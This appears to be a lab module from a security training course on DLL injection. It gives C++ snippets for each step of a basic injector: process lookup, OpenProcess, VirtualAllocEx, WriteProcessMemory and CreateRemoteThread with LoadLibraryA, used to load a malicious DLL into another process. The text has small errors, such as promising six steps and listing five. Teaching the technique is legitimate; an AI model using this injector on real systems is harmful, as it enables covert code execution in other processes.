# Task 5 - Abusing DLLs

At a high-level, **DLL injection** can be broken up into six steps:

1. Locate a target process to inject.
2. Open the target process.
3. Allocate memory region for malicious DLL.
4. Write the malicious DLL to allocated memory.
5. Load and execute the malicious DLL.

We will break down a basic DLL injector to identify each of the steps and explain in more depth below.

---

## Step 1: Locate a Target Process

At step one of DLL injection, we must locate a target process. A process can be located using a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Process32First()`, and `Process32Next()`.

```cpp
DWORD getProcessId(const char *processName) {
  HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specified process
    TH32CS_SNAPPROCESS, // Include all processes residing on the system
    0 // Indicates the current process
  );
  if (hSnapshot) {
    PROCESSENTRY32 entry; // Adds a pointer to the PROCESSENTRY32 structure
    entry.dwSize = sizeof(PROCESSENTRY32); // Obtains the byte size of the structure
    if (Process32First( // Obtains the first process in the snapshot
      hSnapshot, // Handle of the snapshot
      &entry // Pointer to the PROCESSENTRY32 structure
    )) {
      do {
        if (!strcmp( // Compares two strings to determine if the process name matches
          entry.szExeFile, // Executable file name of the current process from PROCESSENTRY32
          processName // Supplied process name
        )) {
          return entry.th32ProcessID; // Process ID of matched process
        }
      } while (Process32Next( // Obtains the next process in the snapshot
        hSnapshot, // Handle of the snapshot
        &entry // Pointer to the PROCESSENTRY32 structure
      ));
    }
  }
}

DWORD processId = getProcessId(processName); // Stores the enumerated process ID
```

---

## Step 2: Open the Target Process

At step two, after the PID has been enumerated, we need to open the process. This can be accomplished from a variety of Windows API calls: `GetModuleHandle`, `GetProcAddress`, or `OpenProcess`.

```cpp
HANDLE hProcess = OpenProcess(
  PROCESS_ALL_ACCESS, // Requests all possible access rights
  FALSE, // Child processes do not inherit parent process handle
  processId // Stored process ID
);
```

---

## Step 3: Allocate Memory for the DLL

At step three, memory must be allocated for the provided malicious DLL to reside. As with most injectors, this can be accomplished using `VirtualAllocEx`.

```cpp
LPVOID dllAllocatedMemory = VirtualAllocEx(
  hProcess, // Handle for the target process
  NULL,
  strlen(dllLibFullPath), // Size of the DLL path
  MEM_RESERVE | MEM_COMMIT, // Reserves and commits pages
  PAGE_EXECUTE_READWRITE // Enables execution and read/write access to the committed pages
);
```

---

## Step 4: Write the DLL Path to Memory

At step four, we need to write the malicious DLL path to the allocated memory location. We can use `WriteProcessMemory` to write to the allocated region.

```cpp
WriteProcessMemory(
  hProcess, // Handle for the target process
  dllAllocatedMemory, // Allocated memory region
  dllLibFullPath, // Path to the malicious DLL
  strlen(dllLibFullPath) + 1, // Byte size of the malicious DLL
  NULL
);
```

---

## Step 5: Load and Execute the DLL

At step five, our malicious DLL path is written to memory and all we need to do is load and execute it. To load the DLL we need to use `LoadLibrary` imported from `kernel32`. Once loaded, `CreateRemoteThread` can be used to execute memory using `LoadLibrary` as the starting function.

```cpp
LPVOID loadLibrary = (LPVOID) GetProcAddress(
  GetModuleHandle("kernel32.dll"), // Handle of the module containing the call
  "LoadLibraryA" // API call to import
);

HANDLE remoteThreadHandler = CreateRemoteThread(
  hProcess, // Handle for the target process
  NULL,
  0, // Default size from the executable of the stack
  (LPTHREAD_START_ROUTINE) loadLibrary, // pointer to the starting function
  dllAllocatedMemory, // pointer to the allocated memory region
  0, // Runs immediately after creation
  NULL
);
```

We can compile these steps together to create a DLL injector. Use the C++ injector provided and experiment with DLL injection.
